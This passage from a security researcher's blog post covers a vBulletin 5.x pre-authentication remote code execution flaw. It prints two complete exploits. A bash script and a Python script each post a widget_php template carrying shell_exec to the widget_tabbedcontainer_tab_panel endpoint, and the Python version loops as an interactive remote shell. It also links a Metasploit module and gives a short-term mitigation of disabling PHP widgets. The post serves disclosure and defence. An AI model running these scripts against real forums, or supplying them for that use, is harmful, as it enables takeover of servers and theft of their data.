5
6
7
8
9
</pre></td><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/bin/bash</span>
<span style="color: #666666; font-style: italic;">#</span>
<span style="color: #666666; font-style: italic;"># vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex</span>
<span style="color: #666666; font-style: italic;">#&lt;br&gt;# Usage ./exploit &lt;site&gt; &lt;shell-command&gt;&lt;br&gt;</span>
<span style="color: #666666; font-style: italic;"># Urlencode cmd</span>
<span style="color: #007800;">CMD</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$2</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">perl</span> -MURI::Escape <span style="color: #660033;">-ne</span> <span style="color: #ff0000;">'chomp;print uri_escape($_),&quot;\n&quot;'</span><span style="color: #000000; font-weight: bold;">`</span>
&nbsp;
<span style="color: #666666; font-style: italic;"># Send request</span>
curl <span style="color: #660033;">-s</span> <span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">/</span>ajax<span style="color: #000000; font-weight: bold;">/</span>render<span style="color: #000000; font-weight: bold;">/</span>widget_tabbedcontainer_tab_panel <span style="color: #660033;">-d</span> <span style="color: #ff0000;">'subWidgets[0][template]=widget_php&amp;subWidgets[0][config][code]=echo%20shell_exec(&quot;'</span>+<span style="color: #007800;">$CMD</span>+<span style="color: #ff0000;">'&quot;);exit;'</span></pre></td></tr></table><p class="theCode" style="display:none;">#!/bin/bash
#
# vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex
#&lt;br&gt;# Usage ./exploit &lt;site&gt; &lt;shell-command&gt;&lt;br&gt;
# Urlencode cmd
CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri_escape($_),&quot;\n&quot;'`
# Send request
curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&amp;subWidgets[0][config][code]=echo%20shell_exec(&quot;'+$CMD+'&quot;);exit;'</p></div>
<h3>Python Exploit</h3>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/usr/bin/env python3</span>
<span style="color: #666666; font-style: italic;"># vBulletin 5.x pre-auth widget_tabbedContainer RCE exploit by @zenofex</span>
&nbsp;
import argparse
import requests
import sys
&nbsp;
def run_exploit<span style="color: #7a0874; font-weight: bold;">&#40;</span>vb_loc, shell_cmd<span style="color: #7a0874; font-weight: bold;">&#41;</span>:
    post_data = <span style="color: #7a0874; font-weight: bold;">&#123;</span><span style="color: #ff0000;">'subWidgets[0][template]'</span> : <span style="color: #ff0000;">'widget_php'</span>,
                <span style="color: #ff0000;">'subWidgets[0][config][code]'</span> : <span style="color: #ff0000;">&quot;echo shell_exec('%s'); exit;&quot;</span> <span style="color: #000000; font-weight: bold;">%</span> shell_cmd
                <span style="color: #7a0874; font-weight: bold;">&#125;</span>
    r = requests.post<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #ff0000;">'%s/ajax/render/widget_tabbedcontainer_tab_panel'</span> <span style="color: #000000; font-weight: bold;">%</span> vb_loc, post_data<span style="color: #7a0874; font-weight: bold;">&#41;</span>
    <span style="color: #7a0874; font-weight: bold;">return</span> r.text
&nbsp;
ap = argparse.ArgumentParser<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #007800;">description</span>=<span style="color: #ff0000;">'vBulletin 5.x Ajax Widget Template RCE'</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
ap.add_argument<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #ff0000;">'-l'</span>, <span style="color: #ff0000;">'--location'</span>, <span style="color: #007800;">required</span>=True, <span style="color: #007800;">help</span>=<span style="color: #ff0000;">'Web address to root of vB5 install.'</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
ARGS = ap.parse_args<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">while</span> True:
    try:
        cmd = input<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #ff0000;">&quot;vBulletin5$ &quot;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
        print<span style="color: #7a0874; font-weight: bold;">&#40;</span>run_exploit<span style="color: #7a0874; font-weight: bold;">&#40;</span>ARGS.location, cmd<span style="color: #7a0874; font-weight: bold;">&#41;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
    except KeyboardInterrupt:
        sys.exit<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>Closing shell...&quot;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
    except Exception <span style="color: #c20cb9; font-weight: bold;">as</span> e:
        sys.exit<span style="color: #7a0874; font-weight: bold;">&#40;</span>str<span style="color: #7a0874; font-weight: bold;">&#40;</span>e<span style="color: #7a0874; font-weight: bold;">&#41;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span></pre></td></tr></table><p class="theCode" style="display:none;">#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget_tabbedContainer RCE exploit by @zenofex
import argparse
import requests
import sys
def run_exploit(vb_loc, shell_cmd):
post_data = {'subWidgets[0][template]' : 'widget_php',
'subWidgets[0][config][code]' : &quot;echo shell_exec('%s'); exit;&quot; % shell_cmd
}
r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)
return r.text
ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE')
ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse_args()
while True:
try:
cmd = input(&quot;vBulletin5$ &quot;)
print(run_exploit(ARGS.location, cmd))
except KeyboardInterrupt:
sys.exit(&quot;\nClosing shell...&quot;)
except Exception as e:
sys.exit(str(e))</p></div>
<h3>Metasploit Module</h3>
<p>We&#8217;re also in the process of pushing a public metasploit module to the metasploit-framework project, the pull request for which can be <a href="https://github.com/rapid7/metasploit-framework/pull/13970">found here</a></p>
<figure class="wp-block-image size-large is-resized"><img loading="lazy" src="/wp-content/uploads/2020/08/image.png" alt="" class="wp-image-872" width="580" height="153" /></figure>
<h2>Slides</h2>
<p>I&#8217;ve also published slides: <a href="https://download.exploitee.rs/file/vbulletin/Exploiting_vBulletin_5.6.2_A_Tale_of_a_Patch_Fail.pptx">Exploiting vBulletin 5.6.2 &#8211; A Tale of a Patch Fail</a></p>
<h2>A Short Term Fix</h2>
<p>This fix will disable PHP widgets within your forums and may break some functionality but will keep you safe from attacks until a patch is released by vBulletin.</p>
<ol><li>Go to the vBulletin administrator control panel.</li><li>Click &#8220;Settings&#8221; in the menu on the left, then &#8220;Options&#8221; in the dropdown.</li><li>Choose &#8220;General Settings&#8221; and then click &#8220;Edit Settings&#8221;</li><li>Look for &#8220;Disable PHP, Static HTML, and Ad Module rendering&#8221;, Set to &#8220;Yes&#8221;</li><li>Click &#8220;Save&#8221;</li></ol>
<p>Godspeed and Happy DEFCON Safe Mode</p>
<hr />
</div>

<div id="comments">
<h3>One Comment on &#8220;Exploiting vBulletin: &#8220;A Tale of a Patch Fail&#8221;&#8221;</h3>
<ol class="commentlist">
<li class="alt" id="comment-890">
<div style="float:left;padding-right:5px;"><img alt='' src='https://secure.gravatar.com/avatar/514ea4c08faf79df094f26988b0bf4e0?s=26&#038;d=identicon&#038;r=r' srcset='https://secure.gravatar.com/avatar/514ea4c08faf79df094f26988b0bf4e0?s=52&#038;d=identicon&#038;r=r 2x' class='avatar avatar-26 photo' height='26' width='26' loading='lazy' /></div>
<span>1</span>
<cite><a href='http://Website' rel='external nofollow ugc' class='url'>hacxx</a>&nbsp;said at 8:05 pm on August 16th, 2020:</cite>
<p>Seems like your vuln is already patched. I test it today against a few vBulletin 5 and it doesn&#8217;t work.</p>
</li>
</ol>
</div>
<div class="navigation">
<div class="alignleft"></div>
<div class="alignright"></div>
</div>
</div>
<div id="sidebar">
<div class="block">
<h3>Recent Posts</h3>
<ul>
<li><a href="/2021/orp-the-open-research-project/">ORP &#8211; The Open Research Project</a></li>
<li><a href="/2021/viziown-exploiting-vizio-smartcast/">ViziOwn &#8211; Exploiting the Vizio SmartCast Platform</a></li>
<li><a href="/2020/exploiting-vbulletin-a-tale-of-patch-fail/">Exploiting vBulletin: &#8220;A Tale of a Patch Fail&#8221;</a></li>
<li><a href="/2018/rooting-the-firetv-cube-and-pendant-with-firefu/">Rooting the FireTV Cube and Pendant with FireFU</a></li>
<li><a href="/2017/all-your-things-are-belong-to-us/">All Your Things Are Belong To Us</a></li>
</ul>
</div>
<div class="block">
<h3>Archives</h3>
<ul>
<li><a href='/2021/04/'>April 2021</a></li>
<li><a href='/2021/02/'>February 2021</a></li>
<li><a href='/2020/08/'>August 2020</a></li>
<li><a href='/2018/10/'>October 2018</a></li>
<li><a href='/2017/08/'>August 2017</a></li>
<li><a href='/2017/03/'>March 2017</a></li>
<li><a href='/2017/01/'>January 2017</a></li>
<li><a href='/2015/10/'>October 2015</a></li>
<li><a href='/2015/02/'>February 2015</a></li>
<li><a href='/2014/12/'>December 2014</a></li>
<li><a href='/2014/06/'>June 2014</a></li>
<li><a href='/2013/12/'>December 2013</a></li>
<li><a href='/2013/08/'>August 2013</a></li>
<li><a href='/2013/07/'>July 2013</a></li>
<li><a href='/2013/05/'>May 2013</a></li>
<li><a href='/2013/01/'>January 2013</a></li>
<li><a href='/2012/12/'>December 2012</a></li>
<li><a href='/2012/08/'>August 2012</a></li>
<li><a href='/2012/07/'>July 2012</a></li>
<li><a href='/2012/02/'>February 2012</a></li>
<li><a href='/2011/12/'>December 2011</a></li>
<li><a href='/2011/11/'>November 2011</a></li>
<li><a href='/2011/10/'>October 2011</a></li>
<li><a href='/2011/08/'>August 2011</a></li>
<li><a href='/2011/07/'>July 2011</a></li>
<li><a href='/2011/06/'>June 2011</a></li>
<li><a href='/2011/05/'>May 2011</a></li>
<li><a href='/2011/04/'>April 2011</a></li>
<li><a href='/2011/02/'>February 2011</a></li>
<li><a href='/2011/01/'>January 2011</a></li>
</ul>
</div>
<div class="block">
<h3>Categories</h3>
<ul>
<li class="cat-item cat-item-41"><a href="/category/asus/">Asus</a>
</li>
<li class="cat-item cat-item-4"><a href="/category/google-tv-kernels/">Google TV Kernels</a>
</li>
<li class="cat-item cat-item-6"><a href="/category/gtvhacker/">GTVHacker</a>
</li>
<li class="cat-item cat-item-45"><a href="/category/hisense/">Hisense</a>
</li>
<li class="cat-item cat-item-3"><a href="/category/logitech-revue/">Logitech Revue</a>
</li>
<li class="cat-item cat-item-59"><a href="/category/nas/">NAS</a>
</li>
<li class="cat-item cat-item-55"><a href="/category/nest/">Nest</a>
</li>
<li class="cat-item cat-item-40"><a href="/category/netgear/">Netgear</a>
</li>
<li class="cat-item cat-item-54"><a href="/category/roku/">Roku</a>
</li>
<li class="cat-item cat-item-13"><a href="/category/root/">Root</a>
</li>
<li class="cat-item cat-item-57"><a href="/category/routers/">Routers</a>
</li>
<li class="cat-item cat-item-39"><a href="/category/sony-2/">Sony</a>
</li>
<li class="cat-item cat-item-1"><a href="/category/uncategorized/">Uncategorized</a>
</li>
<li class="cat-item cat-item-35"><a href="/category/updates/">Updates</a>
</li>
<li class="cat-item cat-item-58"><a href="/category/western-digital/">Western Digital</a>
</li>
</ul>
</div>
</div>
<div id="footer">
<p>&copy; Copyright 2021 | <a href="">Exploitee.rs</a> | All Rights Reserved</p>
<p><script type='text/javascript' src='/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.1' id='wp-syntax-js-js'></script>
<script type='text/javascript' src='/wp-includes/js/wp-embed.min.js?ver=5.8' id='wp-embed-js'></script>
</p>
</div>
</div>

</body>
</html>


